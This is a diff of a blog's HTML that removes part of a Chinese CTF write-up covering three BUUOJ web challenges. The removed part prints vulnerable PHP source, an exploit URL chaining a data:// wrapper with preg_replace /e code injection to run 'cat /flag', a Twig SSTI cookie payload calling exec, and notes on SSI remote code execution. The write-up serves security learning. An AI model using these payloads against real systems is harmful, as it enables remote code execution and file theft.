http://node3.buuoj.cn:27223/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7</span><br><span class="line">Cookie: PHPSESSID=gppova7f172e56f11qlrffpb64; JSESSIONID=0740A2433DEA975EE0C0C0CC0D0257D0</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="ZJCTF，不过如此"></a>ZJCTF，不过如此</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.file_get_contents(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?text=data://text/plain,I%20have%20a%20dream&amp;file=next.php</span><br></pre></td></tr></table></figure>
-
-<p>next.php</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://e121170e-2c2b-419c-909f-05b530db4272.node3.buuoj.cn/?&amp;\D*=$&#123;getFlag()&#125;&amp;file=next.php&amp;text=data://,I%20have%20a%20dream&amp;cmd=system(%27cat%20/flag%27);</span><br></pre></td></tr></table></figure>
-
-<h2 id="Cookie-is-so-stable"><a href="#Cookie-is-so-stable" class="headerlink" title="Cookie is so stable"></a>Cookie is so stable</h2><p>根据提示发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=admin</span><br></pre></td></tr></table></figure>
-
-<p>fuzz过程中猜测是ssti</p>
-<p><img src="https://portswigger.net/cms/images/migration/blog/screen-shot-2015-07-20-at-09-21-56.png" alt="image4749"></p>
-<p>检测出是twig</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: PHPSESSID=30c6cb67d4e030c673ad2fa83c35cbc7; user=&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="EasySearch"><a href="#EasySearch" class="headerlink" title="EasySearch"></a>EasySearch</h2><p>在index.php.swp中找到源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	ob_start();</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">get_hash</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="variable">$chars</span> = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;*()+-&#x27;</span>;</span><br><span class="line">		<span class="variable">$random</span> = <span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)].<span class="variable">$chars</span>[mt_rand(<span class="number">0</span>,<span class="number">73</span>)];<span class="comment">//Random 5 times</span></span><br><span class="line">		<span class="variable">$content</span> = uniqid().<span class="variable">$random</span>;</span><br><span class="line">		<span class="keyword">return</span> sha1(<span class="variable">$content</span>); </span><br><span class="line">	&#125;</span><br><span class="line">    header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	***</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) <span class="keyword">and</span> <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] != <span class="string">&#x27;&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$admin</span> = <span class="string">&#x27;6d0bc1&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$admin</span> == substr(md5(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]),<span class="number">0</span>,<span class="number">6</span>)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[+] Welcome to manage system&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$file_shtml</span> = <span class="string">&quot;public/&quot;</span>.get_hash().<span class="string">&quot;.shtml&quot;</span>;</span><br><span class="line">            <span class="variable">$shtml</span> = fopen(<span class="variable">$file_shtml</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line">            <span class="variable">$text</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello,&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/h1&gt;</span></span><br><span class="line"><span class="string">            ***</span></span><br><span class="line"><span class="string">			***&#x27;</span>;</span><br><span class="line">            fwrite(<span class="variable">$shtml</span>,<span class="variable">$text</span>);</span><br><span class="line">            fclose(<span class="variable">$shtml</span>);</span><br><span class="line">            ***</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;[!] Header  error ...&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;[!] Failed&#x27;)&lt;/script&gt;&quot;</span>;</span><br><span class="line">            </span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">	***</span><br><span class="line">    &#125;</span><br><span class="line">	***</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>爆破得到密码,</p>
-<p>因为将用户名插入到了shtml,造成ssi rce</p>
-<p> <a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce">https://github.com/vulhub/vulhub/tree/master/httpd/ssi-rce</a> </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/03/31/3%E6%9C%88%E5%81%9A%E9%A2%98/" data-id="cku8ky2wt000udnnfcdbf5lzw" data-title="3月做题" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
-
     </footer>
   </div>
   
@@ -1235,6 +1200,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/03/TSGCTF2021/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
           </li>
         
@@ -1248,10 +1217,6 @@
         
           <li>
             <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
           </li>
         
       </ul>
